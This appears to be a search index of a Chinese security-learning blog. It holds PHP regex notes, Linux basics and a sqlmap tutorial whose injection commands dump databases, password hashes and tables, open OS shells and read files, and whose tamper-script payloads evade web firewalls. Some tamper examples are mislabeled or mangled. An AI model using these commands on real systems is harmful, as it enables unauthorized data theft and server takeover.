）常简写为regex，regexp，RE;\n作用正则表达式通常被用来检索、替换符合规则的文本\n特点\n灵活性、逻辑性和功能性强\n可以快速地用极简单的方式达到支付出的复杂控制\n\n用途\n判断字符串是否符合某规则\n从一个字符串中找出符合规则的所以子字符串\n\n常用字符\n\n\n说明\n符号\n\n\n\n数字\n\\d\n\n\n非字符\n\\D\n\n\n空白字符（空格、制表符、换页符等）\n\\s\n\n\n非空白字符\n\\S\n\n\n制表符\n\\t\n\n\n回车符\n\\r\n\n\n换行符\n\\n\n\n\n单词字符（26个英文字母+数字+下划线）\n\\w\n\n\n非单词字符\n\\W\n\n\n字符集合字符集合：[ 单个字符或字符区间] ，用于匹配集合内字符\n\n如：\n\n[a-z]    表示a-z   26个小写字母\n[ 0-9a-h] 表示0-9 10个数字和a-z 8个字母\n[134a-h] 表示包含数字1，3，5和字母a-h 8个字母\n\n注意：两个不同字符段间请勿使用逗号，隔开\n反选字符非集：[\\^单个字符或区间]，用于匹配非集合内字符]\n\n\n反选字符：^\t\n\n[^]  注意：中括号内^ 才是反选\n\n[^0-9]  表示匹配所有非数字字符\n\n[^a-zA-Z] 表示匹配所有非字母字符\n\n\n关键字\n\n\n关键字\n描述\n\n\n\n^\n匹配输入字符串的开始位置\n\n\n$\n匹配输入字符串的结尾位置\n\n\n（）\n标记一个子表达式的开始和结束位置\n\n\n*\n匹配前面的子表达式零次或多次\n\n\n+\n匹配前面的子表达式一次或多次\n\n\n.\n匹配除换行符\\n之外的任意单个字符\n\n\n[\n标记一个中括号表达式的开始\n\n\n？\n匹配前面的子表达式零次或一次\n\n\n\\\n将下一个字符标记为特殊字符原来的本意\n\n\n{\n标记限定符表达式的开始\n\n\n|\n指明两项之间的一项\n\n\n限定符\n\n\n字符\n描述\n\n\n\n{n}\nn为非负数，匹配连续的字符n次\n\n\n{n,}\nn为非负数，匹配连续的字符n次及以上\n\n\n{n，m}\nn、m均为非负数，n &lt;&#x3D;m,匹配连续的字符 至少n次，至多m次\n\n\n修饰符​\t\n\n\n\n修饰符\n描述\n\n\n\n&#x2F;i\n不区分大小写\n\n\n&#x2F;A\n匹配规则必须从头开始匹配\n\n\n&#x2F;s\n将匹配一切字符\n\n\n&#x2F;X\n正则表达式中的空白字符将会被忽略\n\n\n注意：写在正则表达式的“外面“    &#x2F;a&#x2F;i\n函数PHP中使用正则表达式一定要加&#x2F; 正则表达式内容  &#x2F;\n\npreg_match(正则表达式，匹配的字符串)\n匹配第一个匹配正则的子字符串，未找到返回0.找到返回1\n\npreg_grep()\n匹配第一个匹配正则的字符串数组，包含匹配的字符串和匹配的单元\n\npreg_match_all(正则表达式，匹配的字符串，输出的二维数组)\n能匹配所有的子字符串，返回子字符串匹配的数量\n\npre_replace(正则表达式，替换的字符串，匹配的字符串)\n将所有匹配正则表达式的字符串进行替换\n\n\n","slug":"PHP编程与开发","date":"2023-02-01T02:09:04.026Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"a6aaa0ab5b2e8cb7c48d0382e4a8493d","title":"渗透测试工具-sqlmap详解","content":"谈到渗透测试就离不开sql注入，谈到sql注入就离不开sqlmap，本文旨在介绍sqlmap这款强大的自动化sql注入工具的使用，未来也会根据自己实际遇到的情况进行更新，话不多说，直接开整\nsqlmap介绍其实对于sqlmap这款工具不需要过多介绍了，网上一搜一大把，这里还是简单提一下\nsqlmap是一个自动化的sql注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库有MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB。sqlmap支持五种不同的注入模式：\n\n基于布尔的盲注，即可以根据返回页面判断条件真假的注入；\n基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；\n基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；\n联合查询注入，可以使用union的情况下的注入；\n堆查询注入，可以同时执行多条语句的执行时的注入\n\n\n\n\n\n\n\n\n\n\n比较详细的sqlmap配置及使用文章\nhttps://blog.csdn.net/qq_51768842/article/details/123485836?spm=1001.2014.3001.5502\nhttps://zhuanlan.zhihu.com/p/377428620\nsqlmap入门注意我这里是在kali环境下使用的sqlmap,所以可以直接使用,Windows需要添加环境变量等操作\n判断是否存在注入假设目标的url是http://127.0.0.1/sql/Less-1/?id=1\n那么判断命令就是sqlmap -u http://127.0.0.1/sql/Less-1/?id=1 \n当注入点后面参数大于两个是,需要加双引号,如下:\nsqlmap -u &quot;http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2&quot;\n判断文本中的请求是否存在注入从文件中加载HTTP请求，SQLMap可 以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包，\n这个文本文件通常可以用burp suite生成\n\n判断是否存在注入的命令如下所示，运行后的结果如图所示，-r- -般在存在cookie注入时使用。\nsqlmap -r sql.txt\n\n查询当前用户的所有数据库\nsqlmap.py -u http://192. 168.1.104/sq11/Less-1/?id=1 --dbs\n当继续注入时,–dbs缩写成 -D xxx ，其意思是在 xx数据库中继续查询其他数据\n获取数据库中的表名\nsq1map.py -u &quot;http://192.168.1.7/sq1/union. php?id=1&quot; -D dkeye --tables\n当继续注入时，–tables缩 写成-T，意思是在某表中继续查询。\n获取表中的字段名\nsqlmap.py -u &quot;http://192.168.1. 7/sq1/ union. php?id=1&quot; -D dkeye -T user_ info --columns\n在后续的注入中，–columns缩写成-C。\n获取字段内容\nsqlmap.py -U &quot;http:/ /192.168.1.7/sq1/union. php?id=1&quot; -D dkeye -T user_ info -C username , password -- dump\n获取数据库的所有用户\n该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。\nsqlmap.py -u &quot;http://192. 168.1.7/sq1/union. php?id=1&quot; --users\n获取数据库用户的密码\n该命令的作用是列出数据库用户的密码，如下所示,如果当前用户有读取包含用户密码的权限， SQLMap会先列举出用户，然后列出Hash ，并尝试破解\nsqlmap.py -u http://192.168.1.7/sq1/union. php?id=1&quot; --passwords\n获取当前网站的数据库的名称\nsqlmap.py -u &quot;http://192.168.1.7/sq1/union. php?id=1&quot; --current-db\n获取当前网站数据库的用户名称\nsqlmap.py -u http://192.168.1.7/sq1/union. php?id=1&quot; --current-user\nsqlmap进阶具体可以参看Web安全攻防：渗透测试实战指南中的sqlmap进阶篇，篇幅太长就不详解了\n1&gt;探测等级： –level 5\n–level 5 指的是需要执行的测试等级\n一共有5个等级（1-5） 不加 level 时，默认是1\n5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢。\nlevel&#x3D;2 http cookie会测试\nlevel&#x3D;3 http user-agent&#x2F;referer头会测试\n在不能确定哪个payload或参数为注入点时，建议使用高的level值。\n2&gt;当前用户是否为管理权限： –is -dba\n返回true则为是管理权限，否则不是\n3&gt;列出数据库管理员角色： –roles\n注意：只适用于当前数据库是oracle的时候\n4&gt;HTTP Referer头: –referer\n当level设置为3时，会尝试referer注入\n也可以使用referer命令来欺骗 例如：\n–referer 域名（https://www.baidu.com）\n5&gt;运行自定义sql语句：–sql -shell\n例如：sqlmap.py -u “http://192.168.1.xxx/sql1/union.php?id=1” –sql -shell\n6&gt;运行任意操作系统命令： –os -cmd \n​                       –os -shell\n用 –os -shell参数可以模拟一个真实的shell，输入想执行的命令\n支持asp、asp.net、jsp、php四种语言\n7&gt;从数据库服务器中读取文件 –file-read  ” 路径“\n8&gt;上传文件到数据库服务器中 –file-write\n​                         –file-dest\n用于写入本地文件到服务器中，当数据库为mysql、postgresql、microsoft sql server，且当前用户有权限使用特定函数时，上传的文件可以是文本也可以是二进制文件。\n6.sqlmap自带绕过脚本tamper的讲解\nsqlmap在默认情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改。\ntamper参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则。\n常用的tamper脚本：\napostrophemask.py\n适用数据库：ALL \n作用：将引号替换为utf-8，用于过滤单引号 \n使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”) \n使用脚本后：1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871\nbase64encode.py\n适用数据库：ALL \n作用：替换为base64编码 \n使用脚本前：tamper(“1’ AND SLEEP(5)#”) \n使用脚本后：MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;\nmultiplespaces.py\n适用数据库：ALL \n作用：围绕sql关键字添加多个空格 \n使用脚本前：tamper(‘1 UNION SELECT foobar’) \n使用脚本后：1 UNION SELECT foobar\nspace2plus.py\n适用数据库：ALL \n作用：用加号替换空格 \n使用脚本前：tamper(‘SELECT id FROM users’) \n使用脚本后：SELECT+id+FROM+users\nnonrecursivereplacement.py\n适用数据库：ALL \n作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空） \n使用脚本前：tamper(‘1 UNION SELECT 2–’) \n使用脚本后：1 UNIOUNIONN SELESELECTCT 2–\nspace2randomblank.py\n适用数据库：ALL \n作用：将空格替换为其他有效字符 \n使用脚本前：tamper(‘SELECT id FROM users’) \n使用脚本后：SELECT%0Did%0DFROM%0Ausers\nunionalltounion.py\n适用数据库：ALL \n作用：将union allselect 替换为unionselect \n使用脚本前：tamper(‘-1 UNION ALL SELECT’) \n使用脚本后：-1 UNION SELECT\nsecuresphere.py\n适用数据库：ALL \n作用：追加特定的字符串 \n使用脚本前：tamper(‘1 AND 1&#x3D;1’) \n使用脚本后：1 AND 1&#x3D;1 and ‘0having’&#x3D;’0having’\nspace2dash.py\n适用数据库：ALL \n作用：将空格替换为–，并添加一个随机字符串和换行符 \n使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) \n使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227&#x3D;9227\nspace2mssqlblank.py\n适用数据库：Microsoft SQL Server \n测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005 \n作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’) \n使用脚本前：tamper(‘SELECT id FROM users’) \n使用脚本后：SELECT%0Eid%0DFROM%07users\nbetween.py\n测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n作用：用NOT BETWEEN 0 AND #替换&gt; \n使用脚本前：tamper(‘1 AND A &gt; B–’) \n使用脚本后：1 AND A NOT BETWEEN 0 AND B–\npercentage.py\n适用数据库：ASP \n测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0 \n作用：在每个字符前添加一个% \n使用脚本前：tamper(‘SELECT FIELD FROM TABLE’) \n使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E\nsp_password.py\n适用数据库：MSSQL \n作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password \n使用脚本前：tamper(‘1 AND 9227&#x3D;9227– ‘) \n使用脚本后：1 AND 9227&#x3D;9227– sp_password\ncharencode.py\n测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） \n使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) \n使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45\nrandomcase.py\n测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n作用：随机大小写 \n使用脚本前：tamper(‘INSERT’) \n使用脚本后：INseRt\ncharunicodeencode.py\n适用数据库：ASP、ASP.NET \n测试通过数据库：Microsoft SQL Server 2000&#x2F;2005、MySQL 5.1.56、PostgreSQL 9.0.3 \n作用：适用字符串的unicode编码 \n使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’) \n使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045\nspace2comment.py\n测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n作用：将空格替换为&#x2F;**&#x2F; \n使用脚本前：tamper(‘SELECT id FROM users’) \n使用脚本后：SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;**&#x2F;users\nequaltolike.py\n测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 \n作用：将&#x3D;替换为LIKE \n使用脚本前：tamper(‘SELECT * FROM users WHERE id&#x3D;1’) \n使用脚本后：SELECT * FROM users WHERE id LIKE 1\nequaltolike.py\n测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 \n使用脚本前：tamper(‘1 AND A &gt; B’) \n使用脚本后：1 AND GREATEST(A,B+1)&#x3D;A\nifnull2ifisnull.py\n适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) \n测试通过数据库：MySQL 5.0 and 5.5 \n作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 \n使用脚本前：tamper(‘IFNULL(1, 2)’) \n使用脚本后：IF(ISNULL(1),2,1)\nmodsecurityversioned.py\n适用数据库：MySQL \n测试通过数据库：MySQL 5.0 \n作用：过滤空格，使用mysql内联注释的方式进行注入 \n使用脚本前：tamper(‘1 AND 2&gt;1–’) \n使用脚本后：1 &#x2F;!30874AND 2&gt;1&#x2F;–\nspace2mysqlblank.py\n适用数据库：MySQL \n测试通过数据库：MySQL 5.1 \n作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’) \n使用脚本前：tamper(‘SELECT id FROM users’) \n使用脚本后：SELECT%0Bid%0DFROM%0Cusers\nmodsecurityzeroversioned.py\n适用数据库：MySQL \n测试通过数据库：MySQL 5.0 \n作用：使用内联注释方式（&#x2F;!00000&#x2F;）进行注入 \n使用脚本前：tamper(‘1 AND 2&gt;1–’) \n使用脚本后：1 &#x2F;!00000AND 2&gt;1&#x2F;–\nspace2mysqldash.py\n适用数据库：MySQL、MSSQL \n作用：将空格替换为 – ，并追随一个换行符 \n使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) \n使用脚本后：1–%0AAND–%0A9227&#x3D;9227\nbluecoat.py\n适用数据库：Blue Coat SGOS \n测试通过数据库：MySQL 5.1,、SGOS \n作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换&#x3D; \n使用脚本前：tamper(‘SELECT id FROM users where id &#x3D; 1’) \n使用脚本后：SELECT%09id FROM users where id LIKE 1\nversionedkeywords.py\n适用数据库：MySQL \n测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11 \n作用：注释绕过 \n使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’) \n使用脚本后：1&#x2F;!UNION&#x2F;&#x2F;!ALL&#x2F;&#x2F;!SELECT&#x2F;&#x2F;!NULL&#x2F;,&#x2F;!NULL&#x2F;, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;!AS&#x2F;&#x2F;!CHAR&#x2F;),CHAR(32)),CHAR(58,100,114,117,58))#\nhalfversionedmorekeywords.py\n适用数据库：MySQL &lt; 5.1 \n测试通过数据库：MySQL 4.0.18&#x2F;5.0.22 \n作用：在每个关键字前添加mysql版本注释 \n使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’&#x3D;’QDWa”) \n使用脚本后：value’&#x2F;!0UNION&#x2F;!0ALL&#x2F;!0SELECT&#x2F;!0CONCAT(&#x2F;!0CHAR(58,107,112,113,58),&#x2F;!0IFNULL(CAST(&#x2F;!0CURRENT_USER()&#x2F;!0AS&#x2F;!0CHAR),&#x2F;!0CHAR(32)),&#x2F;!0CHAR(58,97,110,121,58)),&#x2F;!0NULL,&#x2F;!0NULL#&#x2F;!0AND ‘QDWa’&#x3D;’QDWa\nspace2morehash.py\n适用数据库：MySQL &gt;&#x3D; 5.1.13 \n测试通过数据库：MySQL 5.1.41 \n作用：将空格替换为#，并添加一个随机字符串和换行符 \n使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) \n使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227\napostrophenullencode.py\n适用数据库：ALL \n作用：用非法双字节Unicode字符替换单引号 \n使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”) \n使用脚本后：1 AND %00%271%00%27&#x3D;%00%271\nappendnullbyte.py\n适用数据库：ALL \n作用：在有效载荷的结束位置加载null字节字符编码 \n使用脚本前：tamper(‘1 AND 1&#x3D;1’) \n使用脚本后：1 AND 1&#x3D;1%00\nchardoubleencode.py\n适用数据库：ALL \n作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） \n使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) \n使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545\nunmagicquotes.py\n适用数据库：ALL \n作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 \n使用脚本前：tamper(“1’ AND 1&#x3D;1”) \n使用脚本后：1%bf%27 AND 1&#x3D;1–\nrandomcomments.py\n适用数据库：ALL \n作用：用注释符分割sql关键字 \n使用脚本前：tamper(‘INSERT’) \n使用脚本后：I&#x2F;**&#x2F;N&#x2F;**&#x2F;SERT\n","slug":"sqlmap详解","date":"2023-01-13T03:16:07.165Z","categories_index":"渗透从入门到入土","tags_index":"渗透测试","author_index":"Abyssaler"},{"id":"ba8a2682be8b63e52959cbada397fdd0","title":"系统安全-Linux操作系统","content":"一:Linux操作系统概述Linux操作系统介绍及作用介绍​\t目前业界客户端大多采用Windows系统，而服务端大多数使用的是Linux，究其根源主要是开源免费，安全性高，支持多用户，支持关闭任意不需要的功能和对硬件资源要求低等因素。同时，Linux也是众多开源产品首先支持的平台，也是实际意义上的服务器和云平台的标准，包括众多安全设备，其内置的也是Linux操作系统（如防火墙，路由器，交换机，IDS和IPS，网闸等产品），对于网络安全的学习来说，掌握Linux操作系统起着至关重要的作用\n操作系统的作用五大基本功能\n\n进程和线程的管理\n存储管理\n文件管理\n设备管理\n用户接口\n\n三个作用\n\n资源的管理者\n向用户提供服务\n对硬件机器的扩展\n\n层次\n内核（Kernel）：用来实现上述的作用，是一个 操作系统 的核心。 是基于硬件的第一层软件扩充，提供操作系统的最基本的功能，是操作系统工作的基础，它负责管理系统的进程、 内存 、设备 驱动 程序、文件和 网络 系统，决定着系统的性能和稳定性。\n壳（Shell）：提供了命令接口，通俗点来说就是让用户直接操作内核的程序，通用的操作系统都要提供一个称为shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统进行工作\n应用程序（Application）：用户平时接触的程序\nLinux操作系统版本首先要知道，Linux是源于Unix\n因为Linux开源免费 的特性，吸引了很多厂商来开发维护，渐渐的就形成了Linux的很多种版本\n\nRedHat：RHEL（Red Hat Enterprise Linux）毕竟是商业版Linux系统，一般多用于企业生产环境，提供完善的商业支持，在性能、稳定性方面也有很大的保障。\nDebian：Debian和Ubuntu是一个派系的，但界面可能没有Ubuntu那么华丽，但是比较稳定，也适合用作服务器操作系统。Debian在开源圈子用得十分广泛，也有一大批开源爱好者活跃于其中。\n中科红旗：红旗Linux是由北京中科红旗软件技术有限公司开发的一系列Linux发行版，包括桌面版、工作站版、数据中心服务器版、HA集群版和红旗嵌入式Linux等产品。红旗Linux是中国较大、较成熟的Linux发行版之一，2014年被大连五甲万京信息科技产业集团收购\nUbuntu：Ubuntu界面比较华丽，包管理器很完善，社区也非常活跃，个人用户确实很多，所以从市面上看的确比较大众化。\nCentOS：CentOS可以理解为是基于RedHat商业版系统的社区编译重发布版，完全开源免费，因此相较于其他一些免费的Linux发行版会更加稳定，也因此一般企业里常用作服务器操作系统。\nFedora：Fedora其实和RedHat也同属一个派系，背后的支撑企业也是红帽子公司。但是Fedora是免费发行版，而且更加侧重于新技术的试验和加持，因此稳定性方面的考量较CentOS会稍微次要一些。\nSUSE：SUSE背后也算是有大公司的支持了，目前主要也还是多用于企业用户。\nArch： Arch的确比较适合好奇心强的人尝鲜，它的官方Wiki做得好，AUR仓库很繁荣，适合DIY玩家去折腾，确实也吸引了不少粉丝。\nManjaro：Manjaro可以看成是Arch Linux的衍生分支，既包含了Arch的常见优点，但也对用户友好，注重体验和稳定性。Manjaro的安装和使用都比较方便，目前使用用户非常多。\nGentoo：Gentoo适合极客范化的折腾，也比较适合有特殊需要和特殊化定制的需求，总体来说比较小众。但是用得很6的大佬们都说好，因为这些大佬们大多有系统洁癖，控制欲很强，什么都需要自己编译、自己定制，这个对他们来说简直就是天堂了。\nKali：kali是一个面向安全的基于Debian的Linux发行版，预装了大量的安全软件。其主要功能有三个：数字取证、安全审计、渗透测试。kali首先是一个操作系统，更确切的说它是一个基于Linux kernel的操作系统，该系统从BackTrack发展而来。而BT是2006年推出的一个用于渗透测试及黑客攻防的专用平台，基于Knoppix（linux的一个发行版）开发。Backtrack从2006年的起始版本BackTrack v.1.0Beta开始，到2012年推出最终版本BackTrack 5 R3 relerse。之后，2013年offensive Security的Mati Aharoni和Devon Kearns基于Debian重新实现了BackTrack，新的产品命名为kali，从此kali成为新的替代品和后继者。\n。。。。。\n\n通常情况下,服务器端操作系统(Windows,Linux)是不会安装GUI界面的,只有一个内核加Shell,再加少量命令行\n二:Linux系统安装这里我安装的是centos7\n\n\n\n\n\n\n\n\n\n具体安装过程可参考以下连接:\nbilibili:\nhttps://www.bilibili.com/video/BV1SY411p7F9/?p=119&amp;vd_source=7c5a074543c3447221c9299649d0a816\n其他:\nhttps://blog.csdn.net/qq_45743985/article/details/121152504\n\n三:使用XShell远程连接Linuxssh协议介绍​\tSSH 叫安全外壳协议（Secure Shell），是一种加密的网络传输协议，可在不安全的网络中网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现 SSH 客户端和服务器之间的连接。最早的时候，互联网通信都是明文通信，一旦被截获，内容就会被暴露。1995年，芬兰学者 Tatu Ylonen 设计了 SSH 协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为所有操作系统的标准配置。\n\n\n\n\n\n\n\n\n\n贴几篇参考文章:\nhttps://zhuanlan.zhihu.com/p/235610836\nhttps://info.support.huawei.com/info-finder/encyclopedia/zh/SSH.html\n我们可以用一些远程shell连接通过ssh等协议来远程连接Linux服务器\nXShell使用\n\n\n\n\n\n\n\n\n照例贴个参考文章\nhttps://blog.csdn.net/weixin_47230291/article/details/126905158\nps：在连接之前最好先配置一下你要连接的Linux主机的ip\n\n\n\n\n\n\n\n\n\nlinux配置ip参考:\nhttps://blog.csdn.net/u010521062/article/details/114067036\n进入xshell后点击新建\n\n进行配置\n\n\n\n就连接成功了\n\nssh与scp命令ssh命令win10及Linux都自带了针对ssh远程连接的命令,假如你的电脑上没有安装xshell等工具,可以直接用系统自带的服务进行远程连接\nwindows连接:\nssh -l 用户名 ip\n比如:ssh -l root 192.168.2.112,然后输入密码\n或者ssh root@192.168.2.112\nLinux连接\nssh root@192.168.2.112\nscp命令从Windows上传文件到Linux\n把F:\\Photo\\ico\\1.ico上传到Linux服务器的&#x2F;opt文件夹\nscp F:\\Photo\\ico\\1.ico root@192.168.2.112:/opt\n\n从Linux下载文件到Windows\nC:\\Users\\Denny&gt;scp root@192.168.112.225:/opttest.html E:\\\n移动端ssh客户端工具juiceSSH\nTermius\n…\n四:Linux系统操作文件系统解读在Linux下运行df -h命令,可以查看到目前Linux中存在的硬盘分区情况,及每个分区的磁盘的使用情况\n[root@mycentos mysql]# df -h\nFilesystem      Size  Used Avail Use% Mounted on\ndevtmpfs        900M     0  900M   0% &#x2F;dev\ntmpfs           910M     0  910M   0% &#x2F;dev&#x2F;shm\ntmpfs           910M  9.5M  901M   2% &#x2F;run\ntmpfs           910M     0  910M   0% &#x2F;sys&#x2F;fs&#x2F;cgroup\n&#x2F;dev&#x2F;sda3        39G  1.9G   37G   5% &#x2F;\n&#x2F;dev&#x2F;sda5        19G   33M   19G   1% &#x2F;home\n&#x2F;dev&#x2F;sda1      1014M  142M  873M  14% &#x2F;boot\ntmpfs           182M     0  182M   0% &#x2F;run&#x2F;user&#x2F;0\n\n#filesystem:文件系统,size:分区大小,used:已经使用的空间,avail:剩余的空间,use%:使用率百分比,mounted on:挂载到哪个目录上面\n另外，对上述几个挂载的目录进行一下简单的说明。\n\n&#x2F;dev: dev是设备(device)的英文缩写。&#x2F;dev这个目录对所有的用户都十分重要。因为在这个目录中包含了所有Linux系统中使用的外部设备。\n&#x2F;dev&#x2F;shm: &#x2F;dev&#x2F;shm&#x2F;是linux下一 个非常有用的目录，因为这个目录不在硬盘上,而是在内存里。因此在linux下，就不需要大费周折去建ramdisk,直接使用&#x2F;dev&#x2F;shm&#x2F;就可达到很好的优化效果。该分区的大小通常是系统内存的一半大小，由于该目录是驻留在内存中，所以对于在系统中需要使用的临时数据，可以将其存储在该目录中，就相当于我们直接在使用内存读写文件，速度相当快。(基本上来说，内存的读写速度可以达到硬盘的100倍左右)。\n&#x2F;run: 一些运行过程中跟用户或进程有关的数据，属于内核级文件。\n&#x2F;sys&#x2F;fs&#x2F;cgroup: 关于运行过程中CPU、内存等数据，属于内核级文件。\n&#x2F;:根目录，用户可以使用的保存操作系统其他文件的目录,用户也可以创建自己的目录。\n&#x2F;boot:操作系统的内核及在引导过程中使用的文件。\n&#x2F;home:普通用户使用的根目录，通常也称之为“家目录”，类似于Windows’ 下的C:\\Users目录。\n&#x2F;run&#x2F;user&#x2F;0: 编号ID为0的用户(通常是指root)在运行过程中产生的数据。\n\n\nlinux目录说明根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的， 同时根目录也与开机&#x2F;还原&#x2F;系统修复等动作有关。 由于系统开机时需要特定的开机软件、核心文件、开机所需程序、 函式库等等文件数据，若系统出现错误时，根目录也必须要包含有能够修复文件系统的程序才行。 因为根目录是这么的重要，所以在FHS的要求方面，他希望根目录不要放在非常大的分区， 因为越大的分区内你会放入越多的数据，如此一来根目录所在分区就可能会有较多发生错误的机会。\n因此FHS标准建议：根目录(&#x2F;)所在分区应该越小越好， 且应用程序所安装的软件最好不要与根目录放在同一个分区内，保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。说白了，就是根目录和Windows的C盘一个样。\n根据以上原因，FHS认为根目录(&#x2F;)下应该包含如下子目录：\n\n\n\n目录\n应放置档案内容\n\n\n\n&#x2F;bin\n系统有很多放置执行档的目录，但&#x2F;bin比较特殊。因为&#x2F;bin放置的是在单人维护模式下还能够被操作的指令。在&#x2F;bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。\n\n\n&#x2F;boot\n主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在&#x2F;boot&#x2F;grub&#x2F;这个目录。\n\n\n&#x2F;dev\n在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp*, &#x2F; dev&#x2F;hd*, &#x2F;dev&#x2F;sd*等等\n\n\n&#x2F;etc\n系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;等等。 另外，其下重要的目录有：&#x2F;etc&#x2F;init.d&#x2F; ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： &#x2F;etc&#x2F;init.d&#x2F;iptables start、&#x2F;etc&#x2F;init.d&#x2F; iptables stop&#x2F;etc&#x2F;xinetd.d&#x2F; ：这就是所谓的super daemon管理的各项服务的设定档目录。&#x2F;etc&#x2F;X11&#x2F; ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。\n\n\n&#x2F;home\n这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号：  ~ ：代表当前使用者的家目录，而 